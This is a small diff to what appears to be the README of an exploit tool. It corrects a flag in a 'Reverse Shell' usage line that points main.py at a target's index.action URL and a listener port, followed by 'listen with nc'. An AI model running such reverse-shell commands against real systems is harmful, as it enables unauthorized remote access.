@@ -39,7 +39,7 @@
    ```
 4. Reverse Shell
    ```py
-   python3 main.py -t https://www.target.com/index.action --lhost 127.0.0.1 --port 443
+   python3 main.py -t https://www.target.com/index.action --lhost 127.0.0.1 --lport 443
    
    listen with nc
    
